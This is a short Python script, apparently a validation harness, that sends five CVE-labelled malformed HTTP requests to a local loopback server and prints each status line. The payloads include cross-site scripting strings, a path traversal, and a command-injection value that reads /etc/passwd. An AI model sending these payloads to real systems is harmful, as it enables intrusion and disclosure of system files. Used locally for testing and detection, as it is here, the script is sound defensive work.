#!/usr/bin/env python3
"""Send malformed request targets only to a local loopback validation server."""

import socket
import sys

TARGETS = {
    "CVE-2023-33568": b"/public/ticket/ajax/ajax.php?action=getContacts&email=%",
    "CVE-2023-39600": b'/webmail/?color=\"><img src=x onerror=confirm(document.domain)>',
    "CVE-2023-32235": b"/assets/built%2F..%2F..%2F%E0%A4%A/package.json",
    "CVE-2015-6544": b"/pages/ajax.render.php?operation=render_dashboard&title=%%3Cscript%3E",
    "CVE-2020-9054": b"/cgi-bin/weblogin.cgi?username=admin';cat /etc/passwd",
}

port = int(sys.argv[1])
for template_id, target in TARGETS.items():
    with socket.create_connection(("127.0.0.1", port), timeout=3) as connection:
        connection.sendall(b"GET " + target + b" HTTP/1.1\r\nHost: local.test\r\nConnection: close\r\n\r\n")
        status = connection.recv(128).split(b"\r\n", 1)[0].decode("ascii", "replace")
    print(f"{template_id}\t{status}")
